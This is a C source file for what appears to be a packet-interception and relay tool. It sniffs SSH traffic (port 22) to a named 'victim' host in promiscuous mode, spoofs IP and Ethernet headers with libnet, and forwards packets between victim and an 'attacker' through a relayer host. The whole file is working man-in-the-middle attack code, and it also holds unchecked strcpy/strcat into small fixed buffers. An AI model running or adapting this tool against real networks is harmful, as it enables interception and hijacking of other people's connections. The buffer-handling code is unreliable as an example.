#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <getopt.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <string.h>
#include <libnet.h>
#include <stdint.h>


/* Ethernet addresses are 6 bytes */
//#define ETHER_ADDR_LEN	6
#define SIZE_ETHERNET 14
	/* Ethernet header */
	struct sniff_ethernet {
		u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
		u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
		u_short ether_type; /* IP? ARP? RARP? etc */
	};

	/* IP header */
	struct sniff_ip {
		u_char ip_vhl;		/* version << 4 | header length >> 2 */
		u_char ip_tos;		/* type of service */
		u_short ip_len;		/* total length */
		u_short ip_id;		/* identification */
		u_short ip_off;		/* fragment offset field */
	#define IP_RF 0x8000		/* reserved fragment flag */
	#define IP_DF 0x4000		/* dont fragment flag */
	#define IP_MF 0x2000		/* more fragments flag */
	#define IP_OFFMASK 0x1fff	/* mask for fragmenting bits */
		u_char ip_ttl;		/* time to live */
		u_char ip_p;		/* protocol */
		u_short ip_sum;		/* checksum */
		struct in_addr ip_src,ip_dst; /* source and dest address */
	};
	#define IP_HL(ip)		(((ip)->ip_vhl) & 0x0f)
	#define IP_V(ip)		(((ip)->ip_vhl) >> 4)

	/* TCP header */
	typedef u_int tcp_seq;

	struct sniff_tcp {
		u_short th_sport;	/* source port */
		u_short th_dport;	/* destination port */
		tcp_seq th_seq;		/* sequence number */
		tcp_seq th_ack;		/* acknowledgement number */
		u_char th_offx2;	/* data offset, rsvd */
	#define TH_OFF(th)	(((th)->th_offx2 & 0xf0) >> 4)
		u_char th_flags;
	#define TH_FIN 0x01
	#define TH_SYN 0x02
	#define TH_RST 0x04
	#define TH_PUSH 0x08
	#define TH_ACK 0x10
	#define TH_URG 0x20
	#define TH_ECE 0x40
	#define TH_CWR 0x80
	#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
		u_short th_win;		/* window */
		u_short th_sum;		/* checksum */
		u_short th_urp;		/* urgent pointer */
};

u_int32_t v_ip;
char *v_ips;
u_int32_t r_ip;
char *r_ips;
u_int8_t *v_mac;
char *v_macs;
u_int8_t *r_mac;
char *r_macs;
libnet_t *ln_context;
char dev[32];
void relay_IP(const struct sniff_ethernet *ethernet, const struct sniff_ip *ip, const struct sniff_tcp *tcp, const u_char *payload, u_int32_t payload_s){
	// Send packet from relayer to attacker
	printf("Sending packet from relayer to attacker\n");
	// Construct IP header
	if (libnet_build_ipv4 (ip->ip_len,
    		ip->ip_tos, ip->ip_id, ip->ip_off,
    		ip->ip_ttl, ip->ip_p, ip->ip_sum,
    		r_ip, ip->ip_src.s_addr, payload,
    		payload_s, ln_context, 0) == -1 )
  	{
    		fprintf(stderr, "Error building IP header: %s\n",\
        	libnet_geterror(ln_context));
    		libnet_destroy(ln_context);
    		exit(0);
  	}
	// Construct Ethernet header
	if ( libnet_build_ethernet(ethernet->ether_shost, r_mac, ethernet->ether_type, 
		NULL, 0, ln_context, 0) == -1 )
  	{
    		fprintf(stderr, "Error building Ethernet header: %s\n",\
        	libnet_geterror(ln_context));
    		libnet_destroy(ln_context);
    		exit(0);
  	}
	int bytes_written = libnet_write(ln_context);
	if ( bytes_written != -1 )
    		printf("%d bytes written.\n", bytes_written);
  	else
    		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(ln_context));
	
	// Receive response from attacker to relayer
	printf("Receiving response from attacker to relayer\n");
	/* Find the properties for the device */
	bpf_u_int32 mask;		/* Our netmask */
	bpf_u_int32 net;		/* Our IP */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	/* Open the session in promiscuous mode */
	struct bpf_program fp;		/* The compiled filter */
	char filter_exp[256];	/* The filter expression */
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return;
	}
	if (pcap_datalink(handle) != DLT_EN10MB) {
		printf("Device %s doesn't provide Ethernet headers - not supported\n", dev);
		return;
	}
	/* Compile and apply the filter */
	strcpy(filter_exp, "dst host ");
	strcat(filter_exp, r_ips);
	strcat(filter_exp, " and src host ");
	strcat(filter_exp, inet_ntoa(ip->ip_src));
	strcat(filter_exp, " and dst port ");
	char sport[16];
	sprintf(sport, "%hu", tcp->th_sport);
	strcat(filter_exp, sport);
	strcat(filter_exp, " and src port ");
	char dport[16];
	sprintf(dport, "%hu", tcp->th_dport);
	strcat(filter_exp, dport);
	printf("Filter string: %s\n", filter_exp);
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return;
	}
	
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return;
	}
	struct pcap_pkthdr header;	/* The header that pcap gives us */
	/* Grab a packet */
	const u_char *packet;		/* The actual packet */
	packet = pcap_next(handle, &header);
	printf("Jacked a packet with length of [%d]\n", header.len);
	if(packet == NULL){
		printf("Error: packet is null pointer\n");
		return;
	}
	// Send response from victim to attacker
	printf("Sending response from victim to attacker\n");
	const struct sniff_ethernet *new_ethernet; /* The ethernet header */
	const struct sniff_ip *new_ip; /* The IP header */
	const struct sniff_tcp *new_tcp; /* The TCP header */
	printf("Packet address: %p\n", packet);
	u_int size_ip;
	u_int size_tcp;
	printf("Initialized variables\n");
	new_ethernet = (struct sniff_ethernet*)(packet);
	//printf("Ethernet type: %hu\n", new_ethernet->ether_type);
	
	new_ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	printf("Calling IP_HL: ");
	//printf("%u\n", new_ip->ip_vhl);
	//size_ip = IP_HL(new_ip)*4;
	size_ip = 20;
	printf("Checking ip header length\n");
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}
	new_tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
	printf("Calling TH_OFF\n");
	//size_tcp = TH_OFF(new_tcp)*4;
	size_tcp = 20;
	printf("Checking tcp header length\n");
	if (size_tcp < 20) {
		printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
		return;
	}
	const u_char *new_ip_payload = (u_char *)(packet + SIZE_ETHERNET + size_ip);
	u_int32_t new_ip_payload_s = header.len - (SIZE_ETHERNET + size_ip);
	// Construct IP header
	printf("Constructing IP header\n");
	if (libnet_build_ipv4 (new_ip->ip_len,
    		new_ip->ip_tos, new_ip->ip_id, new_ip->ip_off,
    		new_ip->ip_ttl, new_ip->ip_p, new_ip->ip_sum,
    		v_ip, new_ip->ip_src.s_addr, new_ip_payload,
    		new_ip_payload_s, ln_context, 0) == -1 )
  	{
    		printf("Error building IP header: %s\n",\
        	libnet_geterror(ln_context));
    		libnet_destroy(ln_context);
    		exit(0);
  	}
	// Construct Ethernet header
	printf("Constructing ethernet header\n");
	if ( libnet_build_ethernet(new_ethernet->ether_shost, v_mac, new_ethernet->ether_type, 
		NULL, 0, ln_context, 0) == -1 )
  	{
    		printf("Error building Ethernet header: %s\n",\
        	libnet_geterror(ln_context));
    		libnet_destroy(ln_context);
    		exit(0);
  	}
	bytes_written = libnet_write(ln_context);
	if ( bytes_written != -1 )
    		printf("%d bytes written.\n", bytes_written);
  	else
    		printf("Error writing packet: %s\n", libnet_geterror(ln_context));
	printf("Finished relaying packet\n");
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
	printf("Received packet of size %d\n", header->len);
	const struct sniff_ethernet *ethernet; /* The ethernet header */
	const struct sniff_ip *ip; /* The IP header */
	const struct sniff_tcp *tcp; /* The TCP header */
	const u_char *payload; /* Packet payload */

	u_int size_ip;
	u_int size_tcp;	
	ethernet = (struct sniff_ethernet*)(packet);
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}
	tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = TH_OFF(tcp)*4;
	if (size_tcp < 20) {
		printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
		return;
	}
	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
	const u_char *ip_payload = (u_char *)(packet + SIZE_ETHERNET + size_ip);
	u_int32_t ip_payload_s = header->len - (SIZE_ETHERNET + size_ip);
	// Record source and dest addresses
	const char *aux = inet_ntoa(ip->ip_src);
	const char *s_ipad = strcpy((char *) malloc(strlen(aux)+1), aux);
	aux = inet_ntoa(ip->ip_dst);
	const char *d_ipad = strcpy((char *) malloc(strlen(aux)+1), aux);
	aux = ether_ntoa((struct ether_addr *)ethernet->ether_shost);
	const char *s_host = strcpy((char *) malloc(strlen(aux)+1), aux);
	aux = ether_ntoa((struct ether_addr *)ethernet->ether_dhost);
	const char *d_host = strcpy((char *) malloc(strlen(aux)+1), aux);   
	u_short s_port = tcp->th_sport;
	u_short d_port = tcp->th_dport;
	
	printf("Source IP: %s, Source port: %hu, Source eth: %s\nDest IP: %s, Dest port: %hu, Dest eth: %s\n", 
	       s_ipad, s_port, s_host, d_ipad, d_port, d_host);
	       //inet_ntoa(ip->ip_src), ether_ntoa(ethernet->ether_shost), inet_ntoa(ip->ip_dst),ether_ntoa(ethernet->ether_dhost));
	//delete[] s_ipad; delete[] d_ipad;delete[] s_host; delete[] d_host;
	free((void *) s_ipad);
	free((void *) s_host);
	free((void *) d_ipad);
	free((void *) d_host);
	/* Print payload in ASCII */
	printf("header_len = %d, eth = %d, ip = %d, tcp = %d\n", header->len, SIZE_ETHERNET, size_ip, size_tcp);
       int payload_length = header->len -
        (SIZE_ETHERNET + size_ip + size_tcp);
	printf("Payload (len %d):\n", payload_length);
    if (payload_length > 0) {
        const u_char *temp_pointer = payload;
        int byte_count = 0;
        while (byte_count++ < payload_length) {
            printf("%c", *temp_pointer);
            temp_pointer++;
        }
    }
	printf("Checking packet type\n");
	struct ether_header *eptr = (struct ether_header *) packet;
	/* Do a couple of checks to see what packet type we have..*/
	if (ntohs (eptr->ether_type) == ETHERTYPE_IP)
    	{
        printf("Ethernet type hex:%x dec:%d is an IP packet\n",
                ntohs(eptr->ether_type),
                ntohs(eptr->ether_type));
	relay_IP(ethernet, ip, tcp, ip_payload, ip_payload_s);
    	}else  if (ntohs (eptr->ether_type) == ETHERTYPE_ARP)
    	{
        printf("Ethernet type hex:%x dec:%d is an ARP packet\n",
                ntohs(eptr->ether_type),
                ntohs(eptr->ether_type));
    	}else {
        	printf("Ethernet type %x not IP", ntohs(eptr->ether_type));
        	//exit(1);
    	}
        printf("\n");
    
    
	return;	
}

int main(int argc, char *argv[])
{
	char *victim_ip = NULL;
	char *victim_eth = NULL;
	char *relayer_ip = NULL;
	char *relayer_eth = NULL;
	char *interface = NULL;
	int length;
	struct bpf_program fp;		/* The compiled filter */
	char filter_exp[32];	/* The filter expression */
	bpf_u_int32 mask;		/* Our netmask */
	bpf_u_int32 net;		/* Our IP */
	struct pcap_pkthdr header;	/* The header that pcap gives us */
	//const u_char *packet;		/* The actual packet */

	static struct option long_options[] = {
            {"victim-ip",     required_argument, NULL,  'a' },
            {"victim-ethernet",  required_argument, NULL,  'b' },
            {"interface", required_argument,       NULL,  'c'},
            {"relayer-ip",  required_argument, NULL, 'd'},
            {"relayer-ethernet",    required_argument, NULL,  'e' },
            {0,         0,                 0,  0 }
        };
	char ch;
	while ((ch = getopt_long(argc, argv, "", long_options, NULL)) != -1)
	{
    		// check to see if a single character or long option came through
   		switch (ch)
    		{
         	// short option 't'
         	case 'a':
             		victim_ip = optarg; // or copy it if you want to
             		break;
         		// short option 'a'
         	case 'b':
             		victim_eth = optarg; // or copy it if you want to
             		break;
		case 'c':
			interface = optarg;
			break;
		case 'd':
			relayer_ip = optarg;
			break;
		case 'e':
			relayer_eth = optarg;
			break;
    		}
	}
	printf("Victim_ip = %s, victim_eth = %s\nrelayer_ip = %s, relayer_eth = %s\ndevice = %s\n", victim_ip, victim_eth, relayer_ip, relayer_eth, interface);
	
	if (victim_ip == NULL || victim_eth == NULL || relayer_eth == NULL || relayer_ip == NULL){
		printf("Missing args\n");
		return(0);
	}
	strcpy(filter_exp, "dst port 22 and dst host ");
	strcat(filter_exp, victim_ip);
	// Libnet initialization
	char ln_errbuf[LIBNET_ERRBUF_SIZE];
	ln_context = libnet_init(LIBNET_LINK, NULL, ln_errbuf);
	if ( ln_context == NULL ) {
		fprintf(stderr, "libnet_init() failed: %s\n", ln_errbuf);
    		return(0);
  	}
	v_ips = victim_ip;
	v_ip = libnet_name2addr4(ln_context, victim_ip,\
                  LIBNET_DONT_RESOLVE);
	if(v_ip == -1){
		printf("Error converting victim ip address\n");
		return(0);
	}
	r_ips = relayer_ip;
	r_ip = libnet_name2addr4(ln_context, relayer_ip,\
                  LIBNET_DONT_RESOLVE);
	if(r_ip == -1){
		printf("Error converting relayer ip address\n");
		return(0);
	}
	v_macs = victim_eth;
	v_mac = libnet_hex_aton(victim_eth, &length);
	if(v_mac == NULL){
		printf("Error converting victim mac address\n");
		return(0);
	}
	r_macs = relayer_eth;
	r_mac = libnet_hex_aton(relayer_eth, &length);
	if(r_mac == NULL){
		printf("Error converting relayer mac address\n");
		return(0);
	}
	
	char errbuf[PCAP_ERRBUF_SIZE];
	// define the device
	if(interface == NULL){
		char *tmp = pcap_lookupdev(errbuf);
		if (tmp == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
			return(2);
		}else{
			strcpy(dev, tmp);
		}
	}else
		strcpy(dev, interface);
	printf("Device: %s\n", dev);
	// Find the properties for the device
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	pcap_t *handle;
	// open the session
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	// compile and apply the filter
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	// grab a packet
	//packet = pcap_next(handle, &header);
	// loop through packets
	pcap_loop(handle, 10, got_packet, NULL);
	/* Print its length */
	printf("Jacked a packet with length of [%d]\n", header.len);
	/* And close the session */
	pcap_close(handle);
	return(0);
}
